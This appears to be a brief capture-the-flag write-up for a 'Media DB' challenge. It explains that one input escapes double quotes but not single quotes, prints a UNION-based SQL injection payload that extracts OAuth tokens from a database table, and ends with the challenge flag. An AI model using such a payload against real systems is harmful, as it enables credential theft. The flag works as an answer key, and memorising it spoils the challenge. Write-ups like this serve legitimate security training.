# Media DB

This is simple sql injection problem. choice 1, 2, 3 seems to escape " correctly, but not scaping '.

Therefore, we can execute our query in choice 4. by insert following query.

```
'UNION SELECT 1, oauth_token FROM oauth_tokens WHERE 1;--
```

CTF{fridge_cast_oauth_token_cahn4Quo}